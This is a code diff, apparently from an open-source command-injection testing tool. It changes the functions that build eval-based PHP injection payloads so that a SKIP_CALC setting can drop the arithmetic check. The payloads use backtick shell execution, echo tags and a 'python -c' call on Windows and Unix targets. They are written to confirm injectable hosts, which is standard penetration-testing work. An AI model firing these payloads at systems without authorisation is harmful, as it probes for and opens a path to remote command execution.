@@ -26,38 +26,65 @@ eval-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
-    if separator == "":
-      payload = ("print(`echo " + TAG + "`." +
-                  "`for /f \"tokens=*\" %i in ('cmd /c \"" + 
-                  "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
-                  "\"') do @set /p =%i < nul`." +
-                  "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)" +
-                  separator
-                )
+    if settings.SKIP_CALC: 
+      if separator == "":
+        payload = ("print(`echo " + TAG + "`." +
+                    "`echo " + TAG + "`." +
+                    "`echo " + TAG + "`)" +
+                    separator
+                  )
+      else:
+        payload = ("print(`echo " + TAG +
+                    separator + "echo " + TAG +
+                    separator + "echo " + TAG + "`)%3B"
+                  )
     else:
-      payload = ("print(`echo " + TAG +
-                  separator + "for /f \"tokens=*\" %i in ('cmd /c \"" + 
-                  "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
-                  "\"') do @set /p =%i < nul" + 
-                  separator + "echo " + TAG +
-                  separator + "echo " + TAG + "`)%3B"
-                )
+      if separator == "":
+        payload = ("print(`echo " + TAG + "`." +
+                    "`for /f \"tokens=*\" %i in ('cmd /c \"" + 
+                    "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
+                    "\"') do @set /p =%i < nul`." +
+                    "`echo " + TAG + "`." +
+                    "`echo " + TAG + "`)" +
+                    separator
+                  )
+      else:
+        payload = ("print(`echo " + TAG +
+                    separator + "for /f \"tokens=*\" %i in ('cmd /c \"" + 
+                    "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
+                    "\"') do @set /p =%i < nul" + 
+                    separator + "echo " + TAG +
+                    separator + "echo " + TAG + "`)%3B"
+                  )
+
   else:
-    if separator == "":
-      payload = ("print(`echo " + TAG + "`." +
-                  "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
-                  "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)" +
-                  separator
-                )
+    if settings.SKIP_CALC: 
+      if separator == "":
+        payload = ("print(`echo " + TAG + "`." +
+                    "`echo " + TAG + "`." +
+                    "`echo " + TAG + "`)" +
+                    separator
+                  )
+      else:
+        payload = ("print(`echo " + TAG +
+                    separator + "echo " + TAG +
+                    separator + "echo " + TAG + "`)%3B"
+                  )
     else:
-      payload = ("print(`echo " + TAG +
-                  separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" +
-                  separator + "echo " + TAG +
-                  separator + "echo " + TAG + "`)%3B"
-                )
-      
+      if separator == "":
+        payload = ("print(`echo " + TAG + "`." +
+                    "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
+                    "`echo " + TAG + "`." +
+                    "`echo " + TAG + "`)" +
+                    separator
+                  )
+      else:
+        payload = ("print(`echo " + TAG +
+                    separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" +
+                    separator + "echo " + TAG +
+                    separator + "echo " + TAG + "`)%3B"
+                  )
+
   return payload
 
 """
@@ -66,35 +93,62 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_DIR + " -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
-    if separator == "":
-      payload = ("print(`echo " + TAG + "`." +
-                  "` cmd /c " + python_payload + "`." +
-                  "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)" +
-                  separator
-                )
+    if settings.SKIP_CALC: 
+      if separator == "":
+        payload = ("print(`echo " + TAG + "`." +
+                    "`echo " + TAG + "`." +
+                    "`echo " + TAG + "`)" +
+                    separator
+                  )
+      else:
+        payload = ("print(`echo " + TAG +
+                    separator + "echo " + TAG +
+                    separator + "echo " + TAG + "`)%3B"
+                  )
     else:
-      payload = ("print(`echo " + TAG +
-                  separator +python_payload + 
-                  separator + "echo " + TAG +
-                  separator + "echo " + TAG + "`)%3B"
-                )
+      if separator == "":
+        payload = ("print(`echo " + TAG + "`." +
+                    "` cmd /c " + python_payload + "`." +
+                    "`echo " + TAG + "`." +
+                    "`echo " + TAG + "`)" +
+                    separator
+                  )
+      else:
+        payload = ("print(`echo " + TAG +
+                    separator +python_payload + 
+                    separator + "echo " + TAG +
+                    separator + "echo " + TAG + "`)%3B"
+                  )
+
   else:
     python_payload = "python -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
-    if separator == "":
-      payload = ("print(`echo " + TAG + "`." +
-                  "` " + python_payload + "`." +
-                  "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)" +
-                  separator
-                )
+    if settings.SKIP_CALC: 
+      if separator == "":
+        payload = ("print(`echo " + TAG + "`." +
+                    "`echo " + TAG + "`." +
+                    "`echo " + TAG + "`)" +
+                    separator
+                  )
+      else:
+        payload = ("print(`echo " + TAG +
+                    separator + "echo " + TAG +
+                    separator + "echo " + TAG + "`)%3B"
+                  )
     else:
-      payload = ("print(`echo " + TAG +
-                  separator +python_payload  +
-                  separator + "echo " + TAG +
-                  separator + "echo " + TAG + "`)%3B"
-                )
-      
+      if separator == "":
+        payload = ("print(`echo " + TAG + "`." +
+                    "` " + python_payload + "`." +
+                    "`echo " + TAG + "`." +
+                    "`echo " + TAG + "`)" +
+                    separator
+                  )
+      else:
+        payload = ("print(`echo " + TAG +
+                    separator +python_payload  +
+                    separator + "echo " + TAG +
+                    separator + "echo " + TAG + "`)%3B"
+                  )
+
   return payload
 
 """
